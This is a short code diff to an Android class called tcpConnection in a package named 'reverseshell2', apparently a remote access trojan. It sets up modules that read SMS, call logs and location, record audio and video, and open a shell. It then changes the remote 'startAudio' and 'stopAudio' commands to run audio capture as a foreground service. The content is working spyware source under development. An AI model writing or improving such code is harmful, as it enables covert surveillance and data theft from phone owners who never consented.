@@ -60,7 +60,7 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
         vibrate = new vibrate(context);
         readSMS = new readSMS(context);
         locationManager = new locationManager(context,activity);
-        audioManager = new audioManager(context);
+        audioManager = new audioManager();
         videoRecorder= new videoRecorder();
         readCallLogs = new readCallLogs(context,activity);
         shell = new newShell(activity,context);
@@ -218,11 +218,17 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
                 }
                 else if(line.equals("startAudio"))
                 {
-                    audioManager.startRecording(out);
+                    //audioManager.startRecording(out);
+                    Intent serviceIntent = new Intent(context, com.example.reverseshell2.Payloads.audioManager.class);
+                    serviceIntent.putExtra("ins", "startFore");
+                    ContextCompat.startForegroundService(context, serviceIntent);
                 }
                 else if(line.equals("stopAudio"))
                 {
-                    audioManager.stopRecording(out);
+//                    audioManager.stopRecording(out);
+                    Intent serviceIntent = new Intent(context, com.example.reverseshell2.Payloads.audioManager.class);
+                    serviceIntent.putExtra("ins", "stopFore");
+                    ContextCompat.startForegroundService(context, serviceIntent);
                 }
                 else if(line.matches("startVideo \\d"))
                 {
